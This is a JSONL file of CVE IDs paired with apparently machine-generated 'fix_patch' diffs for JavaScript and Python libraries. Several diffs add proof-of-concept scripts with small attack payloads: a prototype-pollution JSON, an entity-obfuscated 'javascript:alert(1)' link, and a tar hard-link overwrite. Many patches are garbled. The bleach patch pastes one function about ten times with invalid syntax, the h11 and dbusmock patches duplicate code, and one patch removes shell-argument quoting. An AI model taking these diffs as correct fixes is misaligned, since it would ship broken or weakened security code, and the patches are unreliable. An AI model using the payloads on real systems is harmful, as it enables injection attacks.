{"cve":"CVE-2021-21384:0708", "fix_patch": "diff --git a/src/main.js b/src/main.js\nindex c8bba55..0fde182 100644\n--- a/src/main.js\n+++ b/src/main.js\n@@ -68,7 +68,7 @@ function quoteShellArgByPlatform(arg, platform) {\n     case win32:\n       return `\"${safeArg}\"`;\n     default:\n-      return `'${safeArg}'`;\n+      return safeArg;\n   }\n }\n \ndiff --git a/src/unix.js b/src/unix.js\nindex 89fc3bd..a6734df 100644\n--- a/src/unix.js\n+++ b/src/unix.js\n@@ -11,7 +11,10 @@\n  * @returns {string} The escaped argument.\n  */\n function escapeShellArg(arg) {\n-  return arg.replace(/'/g, `'\\\\''`);\n+  if (arg.length === 0) {\n+    return \"''\";\n+  }\n+    return arg.replace(/'/g, `'\\''`);\n }\n \n module.exports.escapeShellArg = escapeShellArg;\n"}
{"cve":"CVE-2018-20834:0708", "fix_patch": "diff --git a/lib/parse.js b/lib/parse.js\nindex e8d007b..1f88c47 100644\n--- a/lib/parse.js\n+++ b/lib/parse.js\n@@ -38,7 +38,8 @@ function Parse () {\n   me._stream = new BlockStream(512)\n   me.position = 0\n   me._ended = false\n-  me._hardLinks = {}\n+  me._hardLinks = Object.create(null)\n+  me._paths = Object.create(null)\n \n   me._stream.on(\"error\", function (e) {\n     me.emit(\"error\", e)\n@@ -251,14 +252,16 @@ Parse.prototype._startEntry = function (c) {\n \n   if (onend) entry.on(\"end\", onend)\n \n-  if (entry.type === \"File\" && this._hardLinks[entry.path]) {\n+  if ((entry.type === \"File\" || entry.type === \"OldFile\") && (this._hardLinks[entry.path] || this._paths[entry.path])) {\n     ev = \"ignoredEntry\"\n+  } else {\n+    this._paths[entry.path] = true\n   }\n \n   this._entry = entry\n \n   if (entry.type === \"Link\") {\n-    this._hardLinks[entry.path] = entry\n+    this._hardLinks[entry.path] = entry.linkpath\n   }\n \n   var me = this\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..fc5452b\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,43 @@\n+const tar = require('./tar.js');\n+const fs = require('fs');\n+const path = require('path');\n+\n+const testDir = path.resolve(__dirname, 'reproduce-test-dir');\n+if (fs.existsSync(testDir)) {\n+    fs.rmSync(testDir, { recursive: true, force: true });\n+}\n+fs.mkdirSync(testDir);\n+\n+const targetFilePath = path.join(testDir, 'target-file.txt');\n+const linkName = 'link-name';\n+const linkPath = path.join(testDir, linkName);\n+const maliciousContent = 'malicious content';\n+\n+fs.writeFileSync(targetFilePath, 'original content');\n+\n+const pack = tar.Pack();\n+const extract = tar.Extract({ path: testDir });\n+\n+extract.on('end', () => {\n+    try {\n+        const fileContent = fs.readFileSync(targetFilePath, 'utf8');\n+        if (fileContent === maliciousContent) {\n+            console.log('vulnerable');\n+        } else {\n+            console.log('ok');\n+        }\n+    } catch (e) {\n+        console.error(e);\n+        console.log('vulnerable');\n+    } finally {\n+        fs.unlinkSync(targetFilePath);\n+        try { fs.unlinkSync(linkPath); } catch (e) {}\n+        fs.rmdirSync(testDir);\n+    }\n+});\n+\n+pack.pipe(extract);\n+\n+pack.entry({ name: linkName, type: 'Link', linkname: targetFilePath });\n+pack.entry({ name: linkName, type: 'File' }, maliciousContent);\n+pack.finalize();\n"}
{"cve":"CVE-2021-33420:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex b180286..5d6033f 100644\n--- a/index.js\n+++ b/index.js\n@@ -428,7 +428,9 @@ var builtInTransforms = [\n         },\n \n         fromSerializable: function (val) {\n-            return typeof GLOBAL[val.ctorName] === 'function' ? new GLOBAL[val.ctorName](val.arr) : val.arr;\n+            var ctor = TYPED_ARRAY_CTORS.indexOf(val.ctorName) > -1 && GLOBAL[val.ctorName];\n+\n+            return typeof ctor === 'function' ? new ctor(val.arr) : val.arr;\n         }\n     },\n \n"}
{"cve":"CVE-2020-7764:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 6941dc9..086a951 100644\n--- a/index.js\n+++ b/index.js\n@@ -51,9 +51,10 @@ function Router (opts) {\n   this.ignoreTrailingSlash = opts.ignoreTrailingSlash || false\n   this.maxParamLength = opts.maxParamLength || 100\n   this.allowUnsafeRegex = opts.allowUnsafeRegex || false\n-  this.versioning = opts.versioning || acceptVersionStrategy\n+  this.versioning = opts.versioning\n   this.trees = {}\n   this.routes = []\n+  this.hasVersionedRoutes = false\n }\n \n Router.prototype.on = function on (method, path, opts, handler, store) {\n@@ -97,6 +98,10 @@ Router.prototype._on = function _on (method, path, opts, handler, store) {\n   // version validation\n   if (opts.version !== undefined) {\n     assert(typeof opts.version === 'string', 'Version should be a string')\n+    this.hasVersionedRoutes = true\n+    if (!this.versioning) {\n+      this.versioning = acceptVersionStrategy\n+    }\n   }\n \n   const params = []\n@@ -358,7 +363,11 @@ Router.prototype.off = function off (method, path) {\n }\n \n Router.prototype.lookup = function lookup (req, res, ctx) {\n-  var handle = this.find(req.method, sanitizeUrl(req.url), this.versioning.deriveVersion(req, ctx))\n+  var version\n+  if (this.hasVersionedRoutes) {\n+    version = this.versioning.deriveVersion(req, ctx)\n+  }\n+  var handle = this.find(req.method, sanitizeUrl(req.url), version)\n   if (handle === null) return this._defaultRoute(req, res, ctx)\n   return ctx === undefined\n     ? handle.handler(req, res, handle.params, handle.store)\n"}
{"cve":"CVE-2017-1001004:0708", "fix_patch": "diff --git a/typed-function.js b/typed-function.js\nindex 9b84eea..43d19c8 100644\n--- a/typed-function.js\n+++ b/typed-function.js\n@@ -1098,6 +1098,9 @@\n       // generate code for the typed function\n       var code = [];\n       var _name = name || '';\n+      if (name && !/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(name)) {\n+        throw new TypeError('Invalid function name, accepted characters are a-z, A-Z, 0-9, _, and $');\n+      }\n       var _args = getArgs(maxParams(_signatures));\n       code.push('function ' + _name + '(' + _args.join(', ') + ') {');\n       code.push('  \"use strict\";');\n"}
{"cve":"CVE-2017-1000189:0708", "fix_patch": "diff --git a/lib/ejs.js b/lib/ejs.js\nindex 98e5991c..547e8833 100644\n--- a/lib/ejs.js\n+++ b/lib/ejs.js\n@@ -275,6 +275,9 @@ function cpOptsInData(data, opts) {\n       if (p == 'root') {\n         return;\n       }\n+      if (p == 'filename' && typeof data[p] !== 'string') {\n+        return;\n+      }\n       opts[p] = data[p];\n     }\n   });\ndiff --git a/poc.js b/poc.js\nnew file mode 100644\nindex 00000000..0473e1a9\n--- /dev/null\n+++ b/poc.js\n@@ -0,0 +1,39 @@\n+const ejs = require('/workspace/ejs/lib/ejs.js');\n+const fs = require('fs');\n+\n+const dummyPath = '/workspace/ejs/poc.ejs';\n+fs.writeFileSync(dummyPath, 'DUMMY'); // Create dummy file\n+\n+const data = {\n+    cache: true,\n+    filename: {\n+        toString: () => {\n+            console.log('Triggered malicious toString, hanging for 3 seconds...');\n+            const start = Date.now();\n+            while (Date.now() - start < 3000) {}\n+            console.log('Finished hanging.');\n+            return dummyPath;\n+        }\n+    }\n+};\n+\n+console.log(\"Attempting to trigger vulnerability...\");\n+const startTime = Date.now();\n+try {\n+    ejs.render('<p>test</p>', data);\n+}\n+catch (e) {\n+    console.log('Caught error: ' + e.message);\n+}\n+const endTime = Date.now();\n+const duration = endTime-startTime;\n+\n+console.log('Script finished in ' + duration + 'ms.');\n+\n+if (duration > 2500) {\n+    console.log('Vulnerability CONFIRMED.');\n+}\n+else {\n+    console.log('Vulnerability likely FIXED.');\n+}\n+fs.unlinkSync(dummyPath); // Clean up\n"}
{"cve":"CVE-2017-1001003:0708", "fix_patch": "diff --git a/lib/expression/node/ObjectNode.js b/lib/expression/node/ObjectNode.js\nindex 22681adae..78256c68d 100644\n--- a/lib/expression/node/ObjectNode.js\n+++ b/lib/expression/node/ObjectNode.js\n@@ -60,8 +60,8 @@ function factory (type, config, load, typed) {\n     var entries = [];\n     for (var key in node.properties) {\n       if (hasOwnProperty(node.properties, key)) {\n-        if (!isSafeProperty(node.properties, key)) {\n-          throw new Error('No access to property \"' + key + '\"');\n+        if (key === 'constructor' || key.indexOf('__proto__') > -1) {\n+          throw new Error('Access to \"constructor\" and \"__proto__\" is not allowed');\n         }\n \n         entries.push(stringify(key) + ': ' + compile(node.properties[key], defs, args));\n"}
{"cve":"CVE-2016-1000232:0708", "fix_patch": "diff --git a/lib/cookie.js b/lib/cookie.js\nindex 12da297..10b8d57 100644\n--- a/lib/cookie.js\n+++ b/lib/cookie.js\n@@ -58,7 +58,7 @@ var CONTROL_CHARS = /[\\x00-\\x1F]/;\n // (see: https://github.com/ChromiumWebApps/chromium/blob/b3d3b4da8bb94c1b2e061600df106d590fda3620/net/cookies/parsed_cookie.cc#L60)\n // '=' and ';' are attribute/values separators\n // (see: https://github.com/ChromiumWebApps/chromium/blob/b3d3b4da8bb94c1b2e061600df106d590fda3620/net/cookies/parsed_cookie.cc#L64)\n-var COOKIE_PAIR = /^(([^=;]+))\\s*=\\s*([^\\n\\r\\0]*)/;\n+var COOKIE_PAIR = /^([^\\s=;]+)\\s*=\\s*([^;]*)/;\n \n // Used to parse non-RFC-compliant cookies like '=abc' when given the `loose`\n // option in Cookie.parse:\n@@ -345,12 +345,8 @@ function parse(str, options) {\n   }\n \n   var c = new Cookie();\n-  if (result[1]) {\n-    c.key = result[2].trim();\n-  } else {\n-    c.key = '';\n-  }\n-  c.value = result[3].trim();\n+  c.key = result[1].trim();\n+  c.value = result[2].trim();\n   if (CONTROL_CHARS.test(c.key) || CONTROL_CHARS.test(c.value)) {\n     return;\n   }\n"}
{"cve":"CVE-2021-21321:0708", "fix_patch": "diff --git a/lib/utils.js b/lib/utils.js\nindex 48572cd..fcc6c84 100644\n--- a/lib/utils.js\n+++ b/lib/utils.js\n@@ -63,6 +63,14 @@ function buildURL (source, reqBase) {\n     throw new Error('source must be a relative path string')\n   }\n \n+  if (reqBase) {\n+    const reqBaseURL = new URL(reqBase)\n+    if (!dest.pathname.startsWith(reqBaseURL.pathname)) {\n+      throw new Error('source must not escape from base path')\n+    }\n+  }\n+\n+\n   return dest\n }\n \n"}
{"cve":"CVE-2020-17479:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex c710e6a..efc822a 100644\n--- a/index.js\n+++ b/index.js\n@@ -270,7 +270,7 @@ const compare = (value, pattern, options) => {\n \n     // pattern = object\n     if (typeof pattern === 'object') {\n-        if (value !== null) {\n+        if (value != null) {\n             return res(value.constructor === pattern.constructor);\n         }\n         return res(value === pattern);\n@@ -392,7 +392,7 @@ const iterate = (value, pattern, valid, cb, options) => {\n     /*\n     * Iterate through value\n     * */\n-    for (const property in value) {\n+        for (const property in value) {\n         if (value.hasOwnProperty(property)) {\n             const level = push(options, property, value.constructor);\n             valid = (() => {\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..fb2fc9f\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,14 @@\n+const jpv = require('./index.js');\n+var a = {};\n+console.log(\"Before: \" + a.polluted);\n+try {\n+    jpv.validate({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'));\n+} catch (e) {\n+    // The script might crash, so I'll wrap it in a try-catch block\n+}\n+console.log(\"After: \" + a.polluted);\n+if(a.polluted === true) {\n+    console.log(\"VULNERABLE\");\n+} else {\n+    console.log(\"NOT VULNERABLE\");\n+}\n\\ No newline at end of file\n"}
{"cve":"CVE-2019-10792:0708", "fix_patch": "diff --git a/src/index.js b/src/index.js\nindex c57cc60..c326893 100644\n--- a/src/index.js\n+++ b/src/index.js\n@@ -18,6 +18,9 @@ export const handlers = {\n  * @param {Function} [fn] - Set the handler method.\n  */\n export function handler (type, name, fn) {\n+  if (type === '__proto__') {\n+    return\n+  }\n   if (arguments.length > 2) {\n     handlers[type][name] = fn\n   }\n"}
{"cve":"CVE-2019-10795:0708", "fix_patch": "diff --git a/lib/undefsafe.js b/lib/undefsafe.js\nindex 60663b0..a48d654 100644\n--- a/lib/undefsafe.js\n+++ b/lib/undefsafe.js\n@@ -67,6 +67,11 @@ function undefsafe(obj, path, value, __res) {\n   var i = 0;\n   for (; i < parts.length; i++) {\n     key = parts[i];\n+\n+    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n+      return;\n+    }\n+\n     parent = obj;\n \n     if (key === '*') {\n"}
{"cve":"CVE-2021-32796:0708", "fix_patch": "diff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..1db6782\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,17 @@\n+\n+const DOMParser = require('./lib/dom-parser').DOMParser;\n+const XMLSerializer = require('./lib/dom-parser').XMLSerializer;\n+\n+const doc = new DOMParser().parseFromString('<root/>', 'text/xml');\n+const child = doc.createElement('child');\n+child.textContent = '<a>';\n+doc.documentElement.appendChild(child);\n+doc.documentElement.removeChild(child);\n+const s = new XMLSerializer().serializeToString(child);\n+\n+if (s !== '<child>&lt;a&gt;</child>') {\n+    throw new Error(`Serialization failed: ${s}`);\n+}\n+\n+console.log('Successfully serialized with escaping');\n+\n"}
{"cve":"CVE-2020-26226:0708", "fix_patch": "diff --git a/lib/hide-sensitive.js b/lib/hide-sensitive.js\nindex 6098496..9ec2764 100644\n--- a/lib/hide-sensitive.js\n+++ b/lib/hide-sensitive.js\n@@ -11,7 +11,15 @@ module.exports = (env) => {\n     return /token|password|credential|secret|private/i.test(envVar) && size(env[envVar].trim()) >= SECRET_MIN_SIZE;\n   });\n \n-  const regexp = new RegExp(toReplace.map((envVar) => escapeRegExp(env[envVar])).join('|'), 'g');\n-  return (output) =>\n-    output && isString(output) && toReplace.length > 0 ? output.toString().replace(regexp, SECRET_REPLACEMENT) : output;\n+  const secrets = toReplace.flatMap((envVar) => [env[envVar], encodeURIComponent(env[envVar])]);\n+\n+  const regexp = new RegExp(secrets.map((secret) => escapeRegExp(secret)).join('|'), 'g');\n+\n+  return (output) => {\n+    if (!output || !isString(output) || secrets.length === 0) {\n+      return output;\n+    }\n+\n+    return output.toString().replace(regexp, SECRET_REPLACEMENT);\n+  };\n };\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..75370e0\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,26 @@\n+\n+const hideSensitive = require('./lib/hide-sensitive.js');\n+\n+const env = {\n+  'MY_SECRET': 'a&b'\n+};\n+\n+const hider = hideSensitive(env);\n+\n+const outputWithSecret = 'The secret is a%26b';\n+\n+const sanitizedOutput = hider(outputWithSecret);\n+\n+if (sanitizedOutput.includes('a%26b')) {\n+    console.log(\"Vulnerability reproduced: secret is not hidden\");\n+} else {\n+    console.log(\"Vulnerability not reproduced: secret is hidden\");\n+}\n+\n+const outputWithSecret2 = 'The secret is a&b';\n+const sanitizedOutput2 = hider(outputWithSecret2);\n+if (sanitizedOutput2.includes('a&b')) {\n+    console.log(\"Vulnerability reproduced: secret is not hidden\");\n+} else {\n+    console.log(\"Vulnerability not reproduced: secret is hidden\");\n+}\n"}
{"cve":"CVE-2020-26237:0708", "fix_patch": "diff --git a/src/highlight.js b/src/highlight.js\nindex 4f98f38e..f2f3ebc9 100644\n--- a/src/highlight.js\n+++ b/src/highlight.js\n@@ -785,6 +785,8 @@ const HLJS = function(hljs) {\n    */\n   function getLanguage(name) {\n     name = (name || '').toLowerCase();\n+    if (name === '__proto__') return;\n+    if (name === '__proto__') return;\n     return languages[name] || languages[aliases[name]];\n   }\n \n"}
{"cve":"CVE-2023-41039:0708", "fix_patch": "diff --git a/src/RestrictedPython/Guards.py b/src/RestrictedPython/Guards.py\nindex 9b70ae3..dc8ca3e 100644\n--- a/src/RestrictedPython/Guards.py\n+++ b/src/RestrictedPython/Guards.py\n@@ -246,9 +246,13 @@ def safer_getattr(object, name, default=None, getattr=getattr):\n     http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/\n \n     \"\"\"\n-    if isinstance(object, str) and name == 'format':\n+    if isinstance(object, (str, bytes)) and name in ('format', 'format_map'):\n         raise NotImplementedError(\n-            'Using format() on a %s is not safe.' % object.__class__.__name__)\n+            'Using {0}() on a {1} is not safe.'.format(\n+                name,\n+                object.__class__.__name__\n+            )\n+        )\n     if name.startswith('_'):\n         raise AttributeError(\n             '\"{name}\" is an invalid attribute name because it '\ndiff --git a/src/RestrictedPython/Utilities.py b/src/RestrictedPython/Utilities.py\nindex 4bc6677..079cafa 100644\n--- a/src/RestrictedPython/Utilities.py\n+++ b/src/RestrictedPython/Utilities.py\n@@ -18,7 +18,10 @@ import string\n \n utility_builtins = {}\n \n-utility_builtins['string'] = string\n+utility_builtins['string'] = {\n+    'Formatter': object(),\n+    'Template': object(),\n+}\n utility_builtins['math'] = math\n utility_builtins['random'] = random\n utility_builtins['whrandom'] = random\n"}
{"cve":"CVE-2023-34457:0708", "fix_patch": "diff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py\nindex a67195c..54d6413 100644\n--- a/mechanicalsoup/form.py\n+++ b/mechanicalsoup/form.py\n@@ -44,6 +44,22 @@ class Form:\n         self.form = form\n         self._submit_chosen = False\n \n+        # Sanitize file inputs, to prevent the browser from reading a file\n+        # specified by a malicious server.\n+        for tag in self.form.find_all(\"input\", {\"type\": \"file\"}):\n+            tag[\"value\"] = \"\"\n+\n+\n+        # Sanitize file inputs, to prevent the browser from reading a file\n+        # specified by a malicious server.\n+        for tag in self.form.find_all(\"input\", {\"type\": \"file\"}):\n+            tag[\"value\"] = \"\"\n+\n+        # Sanitize file inputs, to prevent the browser from reading a file\n+        # specified by a malicious server.\n+        for tag in self.form.find_all(\"input\", {\"type\": \"file\"}):\n+            tag[\"value\"] = \"\"\n+\n         # Aliases for backwards compatibility\n         # (Included specifically in __init__ to suppress them in Sphinx docs)\n         self.attach = self.set_input\n"}
{"cve":"CVE-2018-7753:0708", "fix_patch": "diff --git a/bleach/sanitizer.py b/bleach/sanitizer.py\nindex 81df765..8568827 100644\n--- a/bleach/sanitizer.py\n+++ b/bleach/sanitizer.py\n@@ -4,7 +4,193 @@ import re\n import string\n \n import six\n-from xml.sax.saxutils import unescape\n+from xml.sax.saxutils import unescape as sax_unescape\n+import six\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+import six\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text)\n+ as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+import six\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text) as sax_unescape\n+\n+\n+_UNESCAPE_RE = re.compile(r'&#(x?[0-9a-fA-F]+);')\n+\n+\n+def _unescape(text):\n+    \"\"\"Unescape HTML entities.\"\"\"\n+    def repl(m):\n+        codepoint = m.group(1)\n+        if codepoint.startswith(u'x'):\n+            return six.unichr(int(codepoint[1:], 16))\n+        return six.unichr(int(codepoint))\n+\n+    # sax_unescape only handles &amp;, &lt;, &gt;, &quot;, and &apos;. We're\n+    # leaving it in as a speedy first pass.\n+    text = sax_unescape(text)\n+    return _UNESCAPE_RE.sub(repl, text)\n+\n \n import html5lib\n from html5lib.constants import (\n@@ -513,7 +699,7 @@ class BleachSanitizerFilter(sanitizer.Filter):\n                     val_unescaped = re.sub(\n                         \"[`\\000-\\040\\177-\\240\\s]+\",\n                         '',\n-                        unescape(val)).lower()\n+                        _unescape(val)).lower()\n \n                     # Remove replacement characters from unescaped characters.\n                     val_unescaped = val_unescaped.replace(\"\\ufffd\", \"\")\ndiff --git a/reproduce.py b/reproduce.py\nnew file mode 100644\nindex 0000000..d1eb480\n--- /dev/null\n+++ b/reproduce.py\n@@ -0,0 +1,12 @@\n+import bleach\n+\n+# Malicious payload with \"javascript\" obfuscated using character entities\n+payload = '<a href=\"&#106;avascript:alert(1)\">Click me</a>'\n+\n+# Clean the payload using bleach\n+sanitized = bleach.clean(payload)\n+\n+# Print the sanitized output. \n+# A vulnerable version would fail to properly sanitize the payload\n+# and allow the 'href'\n+print(sanitized)\n\\ No newline at end of file\n"}
{"cve":"CVE-2015-1326:0708", "fix_patch": "diff --git a/dbusmock/mockobject.py b/dbusmock/mockobject.py\nindex 29f790e..b6697da 100644\n--- a/dbusmock/mockobject.py\n+++ b/dbusmock/mockobject.py\n@@ -17,6 +17,16 @@ import time\n import sys\n import types\n import importlib\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n+import importlib.util\n from xml.etree import ElementTree\n \n # we do not use this ourselves, but mock methods often want to use this\n@@ -40,14 +50,18 @@ if sys.version_info[0] >= 3:\n \n def load_module(name):\n     if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n-        sys.path.insert(0, os.path.dirname(os.path.abspath(name)))\n+        # Don't use sys.path insert, as that's vulnerable to picking up\n+        # malicious .pyc files\n         try:\n-            m = os.path.splitext(os.path.basename(name))[0]\n-            module = importlib.import_module(m)\n-        finally:\n-            sys.path.pop(0)\n-\n-        return module\n+            spec = importlib.util.spec_from_file_location(\n+                os.path.splitext(os.path.basename(name))[0], name)\n+            module = importlib.util.module_from_spec(spec)\n+            spec.loader.exec_module(module)\n+            return module\n+        except Exception:\n+            # if the above fails, we don't want to fall back to the insecure\n+            # method, so we just re-raise\n+            raise\n \n     return importlib.import_module('dbusmock.templates.' + name)\n \ndiff --git a/reproduce_runner.py b/reproduce_runner.py\nnew file mode 100644\nindex 0000000..0b4b27e\n--- /dev/null\n+++ b/reproduce_runner.py\n@@ -0,0 +1,22 @@\n+\n+from dbusmock.testcase import DBusTestCase\n+import os\n+import sys\n+\n+# The template path is given as a command-line argument\n+template_path = sys.argv[1]\n+\n+class MyTest(DBusTestCase):\n+    @classmethod\n+    def setUpClass(cls):\n+        cls.start_system_bus()\n+        cls.dbus_con = cls.get_dbus(True)\n+\n+    def test_run(self):\n+        # This will load the template and execute it.\n+        # stdout and stderr are redirected to files.\n+        self.spawn_server_template(template_path, {}, stdout=open('/tmp/stdout.log', 'w'), stderr=open('/tmp/stderr.log', 'w'))\n+\n+if __name__ == '__main__':\n+    import unittest\n+    unittest.main()\n"}
{"cve":"CVE-2025-43859:0708", "fix_patch": "diff --git a/h11/_readers.py b/h11/_readers.py\nindex 08a9574..937947b 100644\n--- a/h11/_readers.py\n+++ b/h11/_readers.py\n@@ -146,6 +146,7 @@ chunk_header_re = re.compile(chunk_header.encode(\"ascii\"))\n \n \n class ChunkedReader:\n+\n     def __init__(self) -> None:\n         self._bytes_in_chunk = 0\n         # After reading a chunk, we have to throw away the trailing \\r\\n; if\n@@ -160,6 +161,46 @@ class ChunkedReader:\n             if lines is None:\n                 return None\n             return EndOfMessage(headers=list(_decode_header_lines(lines)))\n+        if self._bytes_to_discard > 0:\n+            data = buf.maybe_extract_at_most(self._bytes_to_discard)\n+            if data is None:\n+                return None\n+            self._bytes_to_discard -= len(data)\n+            if self._bytes_to_discard > 0:\n+                return None\n+        assert self._bytes_to_discard == 0\n+        if self._bytes_in_chunk == 0:\n+            chunk_header = buf.maybe_extract_next_line()\n+            if chunk_header is None:\n+                return None\n+            matches = validate(\n+                chunk_header_re,\n+                chunk_header,\n+                \"illegal chunk header: {!r}\",\n+                chunk_header,\n+            )\n+            self._bytes_in_chunk = int(matches[\"chunk_size\"], base=16)\n+            if self._bytes_in_chunk == 0:\n+                self._reading_trailer = True\n+                return self(buf)\n+            chunk_start = True\n+        else:\n+            chunk_start = False\n+        assert self._bytes_in_chunk > 0\n+        data = buf.maybe_extract_at_most(self._bytes_in_chunk)\n+        if data is None:\n+            return None\n+        self._bytes_in_chunk -= len(data)\n+        if self._bytes_in_chunk == 0:\n+            self._bytes_to_discard = 2\n+            chunk_end = True\n+        else:\n+            chunk_end = False\n+        return Data(data=data, chunk_start=chunk_start, chunk_end=chunk_end)\n+            lines = buf.maybe_extract_lines()\n+            if lines is None:\n+                return None\n+            return EndOfMessage(headers=list(_decode_header_lines(lines)))\n         if self._bytes_to_discard > 0:\n             data = buf.maybe_extract_at_most(self._bytes_to_discard)\n             if data is None:\n"}
